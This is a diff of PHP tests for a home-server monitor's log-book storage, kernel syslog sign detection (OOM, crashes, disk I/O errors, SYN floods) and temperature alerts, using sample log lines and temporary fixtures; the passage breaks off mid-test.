@@ -20049,7 +20049,11 @@ function testTruthLogsWatch(): void
     $wjs = (string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/desk.js');
     check('truth watch: the bubble never «all quiet» with /var/log full, the round says it', str_contains($wjs, "if (state.round && state.round.syslog_full) return T('bubble.syslog_full'")
         && str_contains($wjs, "T('round.syslog_full', {"));
-    check('truth watch: the posture tile red only for advice (W6)', str_contains($wjs, "alert: !!advice || !!louder"));
+    // 1.96 «einfacher»: one meaning per colour — the tiles' lights are the messenger's (watchmanTiles()); «Only what waits
+    // for you» is red and yellow; «How secure» and «Serious incidents» are no tiles (advice in its tile, incidents in the book)
+    check('truth watch: the lights are the messenger\'s tiles; only red and yellow wait; no tile «posture» or «incidents»',
+        str_contains($wjs, "const tileWaits = (level) => level === 'danger' || level === 'warn';") && str_contains($wjs, 'level: () => tileLevel(id)')
+        && !str_contains($wjs, "id: 'posture', key: 'tile.posture'") && !str_contains($wjs, "id: 'incidents', key: 'tile.incidents'"));
     check('truth watch: the network\'s head says its state while the files aren\'t read (W9)', str_contains($wjs, "senders.length && !stateText[n.state] ? T('watch.net_sum'"));
     exec('rm -rf ' . escapeshellarg($tmp));
 }
@@ -20760,6 +20764,5092 @@ function testExclusive(): void
 }
 
 /**
+ * His book in two files (1.96, concept 6): the entries of the new abilities' kinds (WATCH_KINDS_MORE) in book-more.json,
+ * book.json's shape — an older version reads only book.json and drops kinds it doesn't know at its next write, the second
+ * file it never sees. watchmanBookSplit() sorts, watchmanSave() writes each part only when it changed (no book-more.json
+ * while none of those kinds is booked), watchmanLoad() reads both as one and takes from book-more.json only its own kinds;
+ * the night's files and the metrics know it. With a kind in WATCH_KINDS_MORE (each ability's step adds its own) the round
+ * trip is checked with the first of them.
+ */
+function testWatchmanBookMore(): void
+{
+    $tmp = hardeningTmp('watch-book-more');
+    $t0 = 1795334400;
+    $user = watchmanEntry('flash_user', 'flash_user:zed', $t0, ['user' => 'zed']);
+    $go = watchmanEntry('flash_go', 'flash_go', $t0, []);
+    same('book more: the split — the listed kinds to the second file, the rest to the first, each in its order',
+        [[$go['id']], [$user['id']]], array_map(fn ($l) => array_column($l, 'id'), watchmanBookSplit([$user, $go], ['flash_user'])));
+    same('book more: nothing listed — all to book.json', [[$user['id'], $go['id']], []], array_map(fn ($l) => array_column($l, 'id'), watchmanBookSplit([$user, $go], [])));
+
+    // none of the new kinds booked: book.json as ever, no book-more.json
+    $dir = "$tmp/a";
+    @mkdir($dir, 0700);
+    watchmanSave($dir, ['book' => []], ['book' => [$user]]);
+    same('book more: none of the new kinds — book.json as ever, no book-more.json', [['flash_user'], false],
+        [array_column(readJson("$dir/book.json")['entries'], 'kind'), is_file("$dir/book-more.json")]);
+    // book-more.json takes only its own kinds: another kind there (a hand's copy) is left out
+    file_put_contents("$dir/book-more.json", json_encode(['entries' => [$go]]));
+    same('book more: a kind that isn\'t its own in book-more.json — left out', ['flash_user'], array_column(watchmanLoad($dir)['book'], 'kind'));
+    same('book more: the night\'s files and the metrics know it', [true, true],
+        [in_array('book-more.json', (array) json_decode((string) json_encode(WATCH_NIGHT_FILES), true), true),
+         str_contains((string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php'), "metricsCached((\$dir ?? watchmanDir()) . '/book-more.json', \$kinds)")]);
+
+    $more = array_values((array) json_decode((string) json_encode(WATCH_KINDS_MORE), true));
+    if ($more) {
+        $kind = (string) (array_values(array_filter($more, fn ($k) => isset(WATCH_KINDS[$k])))[0] ?? $more[0]);
+        $new = watchmanEntry($kind, "$kind:x", $t0, []);
+        $dir = "$tmp/b";
+        @mkdir($dir, 0700);
+        watchmanSave($dir, ['book' => []], ['book' => [$user, $new]]);
+        same("book more: $kind to book-more.json, the rest to book.json — read as one", [['flash_user'], [$kind], ['flash_user', $kind]],
+            [array_column(readJson("$dir/book.json")['entries'], 'kind'), array_column(readJson("$dir/book-more.json")['entries'], 'kind'),
+             array_column(watchmanLoad($dir)['book'], 'kind')]);
+        touch("$dir/book.json", $t0 - 100);
+        clearstatcache();
+        $new2 = ['count' => 2] + $new;
+        watchmanSave($dir, ['book' => [$user, $new]], ['book' => [$user, $new2]]);
+        clearstatcache();
+        same('book more: only the part that changed is written (book.json left as it was)', [$t0 - 100, 2],
+            [filemtime("$dir/book.json"), readJson("$dir/book-more.json")['entries'][0]['count'] ?? null]);
+        same('book more: an older version reads book.json alone — the new kind isn\'t there to drop', [], array_values(array_filter(
+            (array) readJson("$dir/book.json")['entries'], fn ($e) => in_array($e['kind'] ?? '', $more, true))));
+    }
+    hardeningRm($tmp);
+}
+
+/**
+ * Signs in the log (1.96, concept 11.3 H, agent/lib/logsigns.php): every pattern meets a line in its source's wording
+ * (nw196-new-4-hardware.md §9) — and lines that look alike but are normal stay silent: a Docker bridge in promiscuous
+ * mode, a USB stick, an NVMe command that came back («completion polled»), a program's own word «error». The evidence
+ * line: no time, no host, no address; the host a line names, in both syslog shapes. Each sign names its kernel source.
+ */
+function testLogsigns(): void
+{
+    $l = fn (string $msg) => "Nov 22 10:00:00 Tower $msg";
+    $cases = [
+        'oom'          => [$l('kernel: Out of memory: Killed process 4242 (emby) total-vm:8123456kB, anon-rss:4000000kB, file-rss:0kB, shmem-rss:0kB, UID:0 pgtables:9000kB oom_score_adj:0'), 'host_oom', 'emby'],
+        'oom_cg'       => [$l('kernel: Memory cgroup out of memory: Killed process 77 (php-fpm) total-vm:1kB, anon-rss:1kB'), 'host_oom', 'php-fpm'],
+        'segfault'     => [$l('kernel: smbd[1234]: segfault at 0 ip 00007f3a2b1c4d5e sp 00007ffd1a2b3c4d error 4 in libc.so.6[7f3a2b000000+195000] likely on CPU 3 (core 3, socket 0)'), 'host_crash', 'smbd'],
+        'gpf'          => [$l('kernel: traps: nginx[999] general protection fault ip:55d0c0ffee00 sp:7ffd00000000 error:0 in nginx[55d0c0000000+100000]'), 'host_crash', 'nginx'],
+        'io'           => [$l('kernel: I/O error, dev sdc, sector 123456 op 0x0:(READ) flags 0x80700 phys_seg 1 prio class 2'), 'hw_io', 'sdc'],
+        'io_old'       => [$l('kernel: blk_update_request: I/O error, dev sdd, sector 8 op 0x1:(WRITE) flags 0x0 phys_seg 1 prio class 0'), 'hw_io', 'sdd'],
+        'medium'       => [$l('kernel: critical medium error, dev sde, sector 987 op 0x0:(READ) flags 0x0 phys_seg 1 prio class 0'), 'hw_io', 'sde'],
+        'xfs'          => [$l('kernel: XFS (md1p1): metadata I/O error in "xfs_imap_to_bp+0x5c/0xa0" at daddr 0x1234 len 32 error 5'), 'hw_io', 'md1p1'],
+        'btrfs'        => [$l('kernel: BTRFS error (device nvme0n1p1): bdev /dev/nvme0n1p1 errs: wr 0, rd 1, flush 0, corrupt 0, gen 0'), 'hw_io', 'nvme0n1p1'],
+        'btrfs_fn'     => [$l('kernel: BTRFS: error (device sdf1) in btrfs_commit_transaction:2489: errno=-5 IO failure (Error while writing out transaction)'), 'hw_io', 'sdf1'],
+        'ext4'         => [$l('kernel: EXT4-fs error (device sdg1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0'), 'hw_io', 'sdg1'],
+        'nvme'         => [$l('kernel: nvme nvme0: I/O tag 25 (0019) opcode 0x2 (I/O Cmd) QID 3 timeout, aborting req_op:READ(0) size:4096'), 'hw_io', 'nvme0'],
+        'nvme_reset'   => [$l('kernel: nvme nvme1: I/O tag 1 (0001) opcode 0x1 (I/O Cmd) QID 2 timeout, reset controller'), 'hw_io', 'nvme1'],
+        'syn'          => [$l('kernel: TCP: request_sock_TCP: Possible SYN flooding on port 192.168.1.5:445. Sending cookies.'), 'host_flood', '445'],
+        'syn6'         => [$l('kernel: TCP: request_sock_TCPv6: Possible SYN flooding on port [2001:db8::5]:443. Sending cookies.'), 'host_flood', '443'],
+        'syn_old'      => [$l('kernel: TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.'), 'host_flood', '80'],
+        'conntrack'    => [$l('kernel: nf_conntrack: nf_conntrack: table full, dropping packet'), 'host_flood', ''],
+        'oops'         => [$l('kernel: Oops: general protection fault, probably for non-canonical address 0xdead: 0000 [#1] PREEMPT SMP NOPTI'), 'hw_kernel', ''],
+        'bug'          => [$l('kernel: kernel BUG at mm/slub.c:432!'), 'hw_kernel', ''],
+        'bug_pf'       => [$l('kernel: BUG: unable to handle page fault for address: ffffffffc0a1b2c3'), 'hw_kernel', ''],
+        'soft'         => [$l('kernel: watchdog: BUG: soft lockup - CPU#3 stuck for 22s! [kworker/3:1:123]'), 'hw_kernel', ''],
+        'hard'         => [$l('kernel: watchdog: CPU2: Watchdog detected hard LOCKUP on cpu 2'), 'hw_kernel', ''],
+        'rcu'          => [$l('kernel: rcu: INFO: rcu_preempt self-detected stall on CPU'), 'hw_kernel', ''],
+        'mce'          => [$l('kernel: mce: [Hardware Error]: Machine check events logged'), 'hw_mce', ''],
+    ];
+    $got = $want = [];
+    foreach ($cases as $id => [$line, $kind, $thing]) {
+        $m = logsignsMatch($line);
+        $got[$id] = $m === null ? null : [$m['kind'], $m['thing']];
+        $want[$id] = [$kind, $thing];
+    }
+    same('logsigns: each pattern meets its source\'s wording — the kind it feeds, what it is about', $want, $got);
+    $quiet = [
+        $l('kernel: br0: port 2(vethabc123) entered promiscuous mode'),
+        $l('kernel: device eth0 entered promiscuous mode'),
+        $l('kernel: usb 1-2: new high-speed USB device number 5 using xhci_hcd'),
+        $l('kernel: nvme nvme0: I/O tag 3 (0003) opcode 0x1 (I/O Cmd) QID 1 timeout, completion polled'),
+        $l('emhttpd: error: get_filesystem_status, 6538: Operation not supported (95): getxattr'),
+        $l('root: Fix Common Problems: Error: Out Of Memory errors detected on your server'),
+        $l('kernel: mdcmd (36): set md_write_method 1'),
+        $l('webgui: Successful login user root from 192.168.20.125'),
+        $l('kernel: x86/mm: Checked W+X mappings: passed, no W+X pages found.'),
+        '',
+    ];
+    same('logsigns: normal lines stay silent — promiscuous mode, a USB device, an NVMe command that came back, a program\'s own «error», FCP\'s words', [],
+        array_values(array_filter(array_map('logsignsMatch', $quiet))));
+    same('logsigns: the evidence — no time, no host, addresses hidden, cut', ['kernel: TCP: request_sock_TCP: Possible SYN flooding on port ‹ip›:445. Sending cookies.',
+        'kernel: TCP: request_sock_TCPv6: Possible SYN flooding on port ‹ip›:443. Sending cookies.', LOGSIGNS_LINE_MAX],
+        [logsignsMatch($cases['syn'][0])['line'], logsignsMatch($cases['syn6'][0])['line'], mb_strlen(logsignsClean($l('kernel: ' . str_repeat('x', 400))))]);
+    same('logsigns: the host a line names — traditional and RFC 3339; none in another shape', ['tower', 'tower', null],
+        [logsignsHost($l('kernel: x')), logsignsHost('2026-11-22T10:00:00.123+01:00 Tower kernel: x'), logsignsHost('kernel: x')]);
+    $signs = (array) json_decode((string) json_encode(LOGSIGNS), true);
+    same('logsigns: every sign names its source and a kind', [], array_keys(array_filter($signs, fn ($s) => !is_array($s) || !preg_match('#^[a-z0-9_/.-]+\.[ch]$#D', (string) ($s['src'] ?? ''))
+        || !is_string($s['kind'] ?? null))));
+    // a sign never matched without the cheap test passing it first
+    same('logsigns: the cheap test lets every case through', [], array_keys(array_filter($cases, fn ($c) => !preg_match(LOGSIGNS_MAYBE, $c[0]))));
+}
+
+/**
+ * The Night Watchman's signs (1.96, watchman-signs.php): read with the logins from his place in the syslog; one entry a
+ * pattern, thing and day, counting up (also once noted), ≤ 3 evidence lines; a service's crash only from the third in an
+ * hour, a program of no service never; a disk named by Unraid (md1p1 → disk1, nvme0 → cache); a line of another host
+ * left out; taken over anew: nothing; hw_io told, the others quiet; the kernel's stumbles kept as evidence for step B;
+ * the entries in book-more.json; the texts.
+ */
+function testWatchmanSigns(): void
+{
+    $tmp = hardeningTmp('watch-signs');
+    $now = strtotime('2026-11-22 10:00:00');
+    $line = fn (int $t, string $msg, string $host = 'Tower') => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " $host $msg\n";
+    $disks = ['disk1' => ['name' => 'disk1', 'device' => 'sdc'], 'cache' => ['name' => 'cache', 'device' => 'nvme0n1']];
+    same('signs disk: md1p1 → disk1, sdc1 → disk1 (sdc), nvme0 → cache, an unknown one as it is',
+        [['dev' => 'md1p1', 'disk' => 'disk1'], ['dev' => 'sdc', 'disk' => 'disk1'], ['dev' => 'nvme0', 'disk' => 'cache'], ['dev' => 'sdz', 'disk' => null]],
+        [watchmanSignDisk('md1p1', $disks), watchmanSignDisk('sdc1', $disks), watchmanSignDisk('nvme0', $disks), watchmanSignDisk('sdz', $disks)]);
+
+    // read with the logins: the signs of what came since his place, their times and hosts
+    $log = "$tmp/syslog";
+    file_put_contents($log, $line($now - 60, 'kernel: Out of memory: Killed process 1 (old) total-vm:1kB'));
+    [, $pos] = watchmanReadLogins($log, null, false, [], $now);
+    file_put_contents($log, $line($now, 'kernel: Out of memory: Killed process 4242 (emby) total-vm:8123456kB, anon-rss:4000000kB')
+        . $line($now + 5, 'webgui: Successful login user root from 192.168.20.10'), FILE_APPEND);
+    [$ev, , $info] = watchmanReadLogins($log, $pos, false, [], $now + 10);
+    same('signs read: only what came since his place — the OOM line with its time and host; the login read as ever',
+        [[['host_oom', 'emby', $now, 'tower']], ['192.168.20.10']], [array_map(fn ($s) => [$s['kind'], $s['thing'], $s['time'], $s['host']], $info['signs']), array_column($ev, 'ip')]);
+
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $sign = function (int $t, string $msg, string $host = 'Tower') use ($line, $now): array {
+        $l = rtrim($line($t, $msg, $host), "\n");
+        return logsignsMatch($l) + ['time' => watchmanLineTime($l, $now + 7200), 'host' => logsignsHost($l)];
+    };
+    $add = function (array $signs, int $t) use (&$book, &$st, $disks): array {
+        return watchmanSignsCompare($book, $st, $signs, 'tower', $disks, $t);
+    };
+    $added = $add([$sign($now, 'kernel: Out of memory: Killed process 4242 (emby) total-vm:1kB'), $sign($now + 60, 'kernel: Out of memory: Killed process 4243 (emby) total-vm:1kB'),
+                   $sign($now + 70, 'kernel: Out of memory: Killed process 50 (plex) total-vm:1kB'), $sign($now + 80, 'kernel: Out of memory: Killed process 51 (x) total-vm:1kB', 'Othernas')], $now + 300);
+    $by = array_column($book, null, 'key');
+    same('signs oom: one entry a program and day, counting up; a line of another host left out',
+        [['host_oom', 'host_oom'], ['host_oom:emby:2026-11-22' => 2, 'host_oom:plex:2026-11-22' => 1]], [$added, array_map(fn ($e) => $e['count'], $by)]);
+    same('signs oom: … the evidence lines, cleaned', ['kernel: Out of memory: Killed process 4242 (emby) total-vm:1kB', 'kernel: Out of memory: Killed process 4243 (emby) total-vm:1kB'],
+        $by['host_oom:emby:2026-11-22']['p']['lines']);
+    $book[0]['noted'] = $now + 400;
+    $add([$sign($now + 500, 'kernel: Out of memory: Killed process 4244 (emby) total-vm:1kB')], $now + 600);
+    same('signs oom: noted, the same day — that line counts on, nothing new', [2, 3, $now + 400], [count($book), $book[0]['count'], $book[0]['noted']]);
+    $add([$sign($now + 86400, 'kernel: Out of memory: Killed process 4245 (emby) total-vm:1kB')], $now + 86400 + 300);
+    same('signs oom: the next day — a new entry', 3, count($book));
+
+    // a service's crashes: from the third in an hour, the first time with all three; a program of no service never
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $seg = fn (int $t, string $prog) => $sign($t, "kernel: {$prog}[1234]: segfault at 0 ip 00007f3a2b1c4d5e sp 00007ffd1a2b3c4d error 4 in libc.so.6[7f3a2b000000+195000]");
+    same('signs crash: twice in an hour — nothing yet', [], $add([$seg($now, 'smbd'), $seg($now + 600, 'smbd')], $now + 900));
+    same('signs crash: the third — one entry with all three', [['host_crash'], 3], [$add([$seg($now + 1200, 'smbd')], $now + 1500), $book[0]['count'] ?? null]);
+    $add([$seg($now + 1300, 'smbd'), $seg($now + 1400, 'myapp'), $seg($now + 1400, 'myapp'), $seg($now + 1400, 'myapp')], $now + 1800);
+    same('signs crash: … then one each; a program of no service never booked', [1, 4], [count($book), $book[0]['count']]);
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $add([$seg($now, 'nginx'), $seg($now + 2000, 'nginx')], $now + 2100);
+    same('signs crash: two in an hour, the third more than an hour after the first — still two in the hour, nothing', [], $add([$seg($now + 3700, 'nginx')], $now + 3800));
+    same('signs crash: php-fpm with its version is a service', ['host_crash'], (function () use ($add, $seg, $now) {
+        $add([$seg($now, 'php-fpm8.4'), $seg($now + 1, 'php-fpm8.4')], $now + 10);
+        return $add([$seg($now + 2, 'php-fpm8.4')], $now + 20);
+    })());
+
+    // read errors: one a device and day, named by Unraid, told; a flood, the table full; the kernel's stumbles as evidence
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $added = $add([$sign($now, 'kernel: I/O error, dev sdc, sector 123456 op 0x0:(READ) flags 0x80700 phys_seg 1 prio class 2'),
+                   $sign($now + 1, 'kernel: XFS (md1p1): metadata I/O error in "xfs_imap_to_bp+0x5c/0xa0" at daddr 0x1234 len 32 error 5'),
+                   $sign($now + 2, 'kernel: nvme nvme0: I/O tag 25 (0019) opcode 0x2 (I/O Cmd) QID 3 timeout, aborting'),
+                   $sign($now + 3, 'kernel: TCP: request_sock_TCP: Possible SYN flooding on port 192.168.1.5:445. Sending cookies.'),
+                   $sign($now + 4, 'kernel: nf_conntrack: nf_conntrack: table full, dropping packet'),
+                   $sign($now + 5, 'kernel: watchdog: BUG: soft lockup - CPU#3 stuck for 22s! [kworker/3:1:123]'),
+                   $sign($now + 6, 'kernel: mce: [Hardware Error]: Machine check events logged')], $now + 300);
+    $texts = array_map(fn ($e) => [$e['kind'], watchmanText($e), watchmanEntryKey($e)], $book);
+    same('signs: read errors by device (Unraid\'s name), a SYN flood by port, the table full — their words',
+        [['hw_io', ['disk' => 'disk1 (sdc)'], 'entry.hw_io'], ['hw_io', ['disk' => 'disk1 (md1p1)'], 'entry.hw_io'], ['hw_io', ['disk' => 'cache (nvme0)'], 'entry.hw_io'],
+         ['host_flood', ['port' => '445'], 'entry.host_flood'], ['host_flood', ['port' => '–'], 'entry.host_flood_table']], $texts);
+    same('signs: hw_io told, the others quiet; areas', [true, false, false, false, 'hw', 'host', 'host', 'host'],
+        [WATCH_KINDS['hw_io'][1], WATCH_KINDS['host_oom'][1], WATCH_KINDS['host_crash'][1], WATCH_KINDS['host_flood'][1],
+         watchmanCatOf('hw_io'), watchmanCatOf('host_oom'), watchmanCatOf('host_crash'), watchmanCatOf('host_flood')]);
+    same('signs: the kernel\'s stumble and the hardware error kept as evidence for step B (not booked)', [1, 'soft_lockup', 1, 'hw_error', 5],
+        [$st['signs']['evidence']['hw_kernel']['n'] ?? null, $st['signs']['evidence']['hw_kernel']['sign'] ?? null, $st['signs']['evidence']['hw_mce']['n'] ?? null,
+         $st['signs']['evidence']['hw_mce']['sign'] ?? null, count($book)]);
+
+    // a whole round: taken over (the log's history: nothing), then a disk's errors — told, in book-more.json
+    $data = "$tmp/data";
+    $src = "$tmp/src";
+    foreach (['plugins', 'extra', 'ssh'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'host_name' => 'Tower', 'disks_ini' => "$tmp/disks.ini"];
+    file_put_contents("$tmp/disks.ini", "[\"disk1\"]\nname=\"disk1\"\ndevice=\"sdc\"\n");
+    file_put_contents($paths['syslog'], $line($now - 3600, 'kernel: I/O error, dev sdc, sector 1 op 0x0:(READ) flags 0x0 phys_seg 1 prio class 2'));
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], "root:*:20000:0:99999:7:::\n");
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $docker = fn () => [];
+    watchmanRound($paths, $data, 1000, $now, $docker, true, "$tmp/acks.json");
+    same('signs round: taken over — the log\'s history booked as nothing', [], array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => $e['kind'] !== 'watch')));
+    file_put_contents($paths['syslog'], $line($now + 100, 'kernel: I/O error, dev sdc, sector 123456 op 0x0:(READ) flags 0x80700 phys_seg 1 prio class 2')
+        . $line($now + 101, 'kernel: I/O error, dev sdc, sector 123464 op 0x0:(READ) flags 0x80700 phys_seg 1 prio class 2'), FILE_APPEND);
+    $r = watchmanRound($paths, $data, 1000, $now + 300, $docker, true, "$tmp/acks.json");
+    $d = watchmanLoad($data);
+    $io = array_values(array_filter($d['book'], fn ($e) => $e['kind'] === 'hw_io'));
+    $calls = array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
+    same('signs round: a disk\'s read errors — one entry (2 lines), told once, in book-more.json, the round counts the signs',
+        [1, 2, true, 1, ['hw_io'], 2], [count($io), $io[0]['count'] ?? null, !empty($io[0]['told']), count($calls), array_column(readJson("$data/book-more.json")['entries'] ?? [], 'kind'),
+         $d['state']['round']['signs'] ?? null]);
+    check('signs round: … the notification names the disk', str_contains($calls[0] ?? '', 'disk1 (sdc)'));
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    same('signs: the day\'s paths name this server; its name short and lower case', [true, true], [array_key_exists('host_name', watchmanPaths()), (bool) preg_match('/^[a-z0-9_-]*$/D', watchmanHostName())]);
+    hardeningRm($tmp);
+}
+
+/**
+ * «Too warm for hours» (1.96, concept 11.3 D, agent/desks/watchman-heat.php): his own reader — NVMe (named by its pool),
+ * CPU (coretemp's packages with their Tcontrol, k10temp's Tdie with its HTC point only), the awake disks from disks.ini
+ * (one asleep, an SSD in standby, the NVMe's pool line: none), never drivetemp; minutes over the limit in 24 hours,
+ * counted per round (at most WATCH_HOT_STEP for a gap); `hw_hot` once a sensor reaches its setting — not for a 10-minute
+ * peak, updated while open, noted: not again that day; a CPU without its own limit: never judged; set.hw within bounds;
+ * the night shift reads no disks.ini. His book in two files: the new kinds in book-more.json (an older version never sees
+ * them), read as one. Texts for every sensor kind.
+ */
+function testWatchmanHot(): void
+{
+    $tmp = hardeningTmp('watch-hot');
+    $sys = "$tmp/hwmon";
+    $mk = function (string $h, array $files) use ($sys): void {
+        @mkdir("$sys/$h", 0700, true);
+        foreach ($files as $f => $v) {
+            file_put_contents("$sys/$h/$f", "$v\n");
+        }
+    };
+    @mkdir("$tmp/dev/nvme0", 0700, true);
+    $mk('hwmon0', ['name' => 'nvme', 'temp1_input' => 72850, 'temp1_label' => 'Composite', 'temp1_crit' => 84850]);
+    symlink("$tmp/dev/nvme0", "$sys/hwmon0/device");
+    $mk('hwmon1', ['name' => 'coretemp', 'temp1_label' => 'Package id 0', 'temp1_input' => 81000, 'temp1_max' => 80000, 'temp2_label' => 'Core 0', 'temp2_input' => 99000]);
+    $mk('hwmon2', ['name' => 'drivetemp', 'temp1_input' => 66000]);
+    $mk('hwmon3', ['name' => 'k10temp', 'temp1_label' => 'Tctl', 'temp1_input' => 90000, 'temp2_label' => 'Tdie', 'temp2_input' => 88000]);
+    $mk('hwmon4', ['name' => 'acpitz', 'temp1_input' => 99000]);
+    $ini = "$tmp/disks.ini";
+    file_put_contents($ini, "[\"parity\"]\nname=\"parity\"\ntype=\"Parity\"\ndevice=\"sdb\"\nstatus=\"DISK_OK\"\ntemp=\"40\"\nspundown=\"0\"\nrotational=\"1\"\n"
+        . "[\"disk1\"]\nname=\"disk1\"\ntype=\"Data\"\ndevice=\"sdc\"\nstatus=\"DISK_OK\"\ntemp=\"57\"\nspundown=\"0\"\nrotational=\"1\"\n"
+        . "[\"disk2\"]\nname=\"disk2\"\ntype=\"Data\"\ndevice=\"sdd\"\nstatus=\"DISK_OK\"\ntemp=\"*\"\nspundown=\"1\"\nrotational=\"1\"\n"
+        . "[\"cache\"]\nname=\"cache\"\ntype=\"Cache\"\ndevice=\"nvme0n1\"\nstatus=\"DISK_OK\"\ntemp=\"73\"\nspundown=\"0\"\nrotational=\"0\"\n"
+        . "[\"cache2\"]\nname=\"cache2\"\ntype=\"Cache\"\ndevice=\"sde\"\nstatus=\"DISK_OK\"\ntemp=\"*\"\nspundown=\"1\"\nrotational=\"0\"\n"
+        . "[\"flash\"]\nname=\"flash\"\ntype=\"Flash\"\ndevice=\"sda\"\nstatus=\"DISK_OK\"\ntemp=\"*\"\n");
+    $look = watchmanHotLook(['hwmon' => $sys, 'hot_disks' => $ini]);
+    same('hot look: NVMe by its pool, the CPU\'s package with its Tcontrol, k10temp\'s Tdie (no HTC point: no limit), the awake disks — never drivetemp, acpitz, the NVMe twice, a sleeping disk or an SSD in standby',
+        [['nvme:cache', 'nvme', 'cache', 73, null], ['cpu:0', 'cpu', 'CPU', 81, 80], ['cpu:1', 'cpu', 'CPU 1', 88, null],
+         ['disk:parity', 'disk', 'parity', 40, null], ['disk:disk1', 'disk', 'disk1', 57, null]],
+        array_map(fn ($s) => [$s['id'], $s['kind'], $s['name'], $s['c'], $s['limit']], (array) $look));
+    same('hot look: the night shift — no disks.ini (watchmanNightPaths()); nothing to read at all: null',
+        [false, true, null], [isset(watchmanNightPaths()['hot_disks']), isset(watchmanNightPaths()['hwmon']), watchmanHotLook(['hwmon' => "$tmp/none"])]);
+    $src = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman-heat.php');
+    check('hot look: drivetemp is never read — only nvme, coretemp, k10temp; no smartctl', str_contains($src, "in_array(\$driver, ['nvme', 'coretemp', 'k10temp'], true)")
+        && !str_contains($src, "'smartctl'") && !str_contains($src, "'drivetemp'"));
+
+    // rounds every 5 minutes: disk1 at 57 °C (limit 55), parity cool, the NVMe at 73 °C (70), the CPU at 81 °C (its 80)
+    $set = watchmanHotSettings(null);
+    $t0 = strtotime('2026-11-22 08:00:00');
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $one = fn (string $s) => array_values(array_filter($look, fn ($x) => $x['id'] === $s));
+    $diskOnly = $one('disk:disk1');
+    $round = function (int $t, ?array $l = null) use (&$book, &$st, &$diskOnly, &$set): array {
+        return watchmanHotCompare($book, $st, $l ?? $diskOnly, $set, $t, false);
+    };
+    $added = [];
+    for ($i = 0; $i <= 24; $i++) {
+        $added[$i] = $round($t0 + 300 * $i);
+    }
+    same('hot: disk1 over 55 °C — nothing until its 120 minutes, then one hw_hot', [[], ['hw_hot'], 1],
+        [array_merge(...array_slice($added, 0, 24)), $added[24], count($book)]);
+    same('hot: … its words (the disk shape), its area, told', ['entry.hw_hot_disk', ['name' => 'disk1', 'c' => '57', 'peak' => '57', 'limit' => '55', 'time' => '2 h 00 min'], 'hw', true],
+        [watchmanEntryKey($book[0]), watchmanText($book[0]), watchmanCatOf('hw_hot'), WATCH_KINDS['hw_hot'][1]]);
+    $round($t0 + 300 * 25);
+    same('hot: … still open: brought up to date, no second entry', [1, 125], [count($book), $book[0]['p']['minutes']]);
+    $book[0]['noted'] = $t0 + 300 * 25;
+    $round($t0 + 300 * 26);
+    same('hot: … noted, the same day: nothing new', 1, count($book));
+    // the next day, still hot all along (the round every 5 minutes): a new one
+    $t1 = strtotime('2026-11-23 08:00:00');
+    for ($t = $t0 + 300 * 27; $t <= $t1; $t += 300) {
+        $round($t);
+    }
+    same('hot: … the next day, still that warm: one new entry', [2, 1], [count($book), count(array_filter($book, 'watchmanOpen'))]);
+
+    // a 10-minute peak, then cool again: nothing; a gap of three hours counts only WATCH_HOT_STEP
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    $cool = [['id' => 'disk:disk1', 'kind' => 'disk', 'name' => 'disk1', 'c' => 45, 'limit' => null]];
+    $hot = [['id' => 'disk:disk1', 'kind' => 'disk', 'name' => 'disk1', 'c' => 62, 'limit' => null]];
+    $round($t0, $cool);
+    $round($t0 + 300, $hot);
+    $round($t0 + 600, $hot);
+    $round($t0 + 900, $cool);
+    same('hot: a 10-minute peak — 10 minutes counted, no entry', [10, []], [watchmanHotMinutes($st['hot']['sensors']['disk:disk1']['spans'], $t0 + 900), $book]);
+    $round($t0 + 900 + 3 * 3600, $hot);
+    same('hot: rounds missed for three hours — the gap counts WATCH_HOT_STEP, not three hours', 20, watchmanHotMinutes($st['hot']['sensors']['disk:disk1']['spans'], $t0 + 900 + 3 * 3600));
+    same('hot: … the highest of the window kept', 62, $st['hot']['sensors']['disk:disk1']['peak']);
+    // spans older than 24 hours go
+    $round($t0 + 900 + 3 * 3600 + 86400, $cool);
+    same('hot: a day later, cool — the old spans gone', [], $st['hot']['sensors']['disk:disk1']['spans']);
+
+    // the CPU: over its own limit 30 minutes → told; k10temp without an HTC point: never judged; NVMe over 70 °C two hours
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    for ($i = 0; $i <= 24; $i++) {
+        $round($t0 + 300 * $i, $look);
+    }
+    $by = array_column(array_map(fn ($e) => [$e['p']['sensor'], $e['p']['minutes']], $book), 1, 0);
